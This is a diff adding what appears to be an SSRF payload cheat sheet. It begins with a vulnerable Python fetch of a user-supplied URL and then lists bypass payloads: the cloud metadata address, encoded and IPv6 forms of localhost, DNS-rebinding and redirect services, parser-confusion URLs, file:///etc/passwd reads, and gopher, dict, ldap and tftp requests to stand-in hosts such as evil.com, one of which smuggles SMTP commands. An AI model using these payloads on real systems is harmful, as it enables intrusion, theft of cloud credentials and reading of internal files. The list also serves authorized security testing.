@@ -1,0 +1,73 @@
+url = input("Enter URL:")
+response = requests.get(url)
+return response
+http://169.254.169.254/latest/meta-data/
+http://localhost:80
+http://localhost:22
+https://localhost:443
+http://127.0.0.1:80
+http://127.0.0.1:22
+https://127.0.0.1:443
+http://0.0.0.0:80
+http://0.0.0.0:22
+https://0.0.0.0:443
+http://[::]:80/
+http://[0000::1]:80/
+http://[0:0:0:0:0:ffff:127.0.0.1]
+http://[::ffff:127.0.0.1]
+NIP.IO maps <anything>.<IP Address>.nip.io to the corresponding <IP Address>, even 127.0.0.1.nip.io maps to 127.0.0.1
+http://127.127.127.127
+http://127.0.1.3
+http://127.0.0.0
+http://0/
+http://127.1
+http://127.0.1
+http://2130706433/ = http://127.0.0.1
+http://3232235521/ = http://192.168.0.1
+http://3232235777/ = http://192.168.1.1
+http://2852039166/ = http://169.254.169.254
+http://0177.0.0.1/ = http://127.0.0.1
+http://o177.0.0.1/ = http://127.0.0.1
+http://0o177.0.0.1/ = http://127.0.0.1
+http://q177.0.0.1/ = http://127.0.0.1
+http://0x7f000001 = http://127.0.0.1
+http://0xc0a80101 = http://192.168.1.1
+http://0xa9fea9fe = http://169.254.169.254
+http://127.0.0.1/%61dmin
+http://127.0.0.1/%2561dmin
+http://ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ = example.com
+http://ip6-localhost = ::1
+http://ip6-loopback = ::1
+https://307.r3dir.me/--to/?url=http://localhost
+https://62epax5fhvj3zzmzigyoe5ipkbn7fysllvges3a.302.r3dir.me
+make-1.2.3.4-rebind-169.254-169.254-rr.1u.ms
+$ nslookup make-1.2.3.4-rebind-169.254-169.254-rr.1u.ms
+Name:   make-1.2.3.4-rebind-169.254-169.254-rr.1u.ms
+Address: 1.2.3.4
+Address: 169.254.169.254
+http://127.1.1.1:80\@127.2.2.2:80/
+http://127.1.1.1:80\@@127.2.2.2:80/
+http://127.1.1.1:80:\@@127.2.2.2:80/
+http://127.1.1.1:80#\@127.2.2.2:80/
+http:127.0.0.1/
+<?php
+echo var_dump(filter_var("http://test???test.com", FILTER_VALIDATE_URL));
+echo var_dump(filter_var("0://evil.com;google.com", FILTER_VALIDATE_URL));
+jar:scheme://domain/path!/
+jar:http://127.0.0.1!/
+jar:https://127.0.0.1!/
+jar:ftp://127.0.0.1!/
+file:///etc/passwd
+file://\/\/etc/passwd
+ssrf.php?url=http://127.0.0.1:22
+ssrf.php?url=http://127.0.0.1:80
+ssrf.php?url=http://127.0.0.1:443
+dict://<user>;<auth>@<host>:<port>/d:<word>:<database>:<n>
+ssrf.php?url=dict://attacker:11111/
+ssrf.php?url=sftp://evil.com:11111/
+ssrf.php?url=tftp://evil.com:12346/TESTUDPPACKET
+ssrf.php?url=ldap://localhost:11211/%0astats%0aquit
+ssrf.php?url=netdoc:///etc/passwd
+gopher://[host]:[port]/[type][selector]
+gopher://localhost:25/_MAIL%20FROM:<attacker@example.com>%0D%0A
+https://example.com/ssrf.php?url=http://brutelogic.com.br/poc.svg
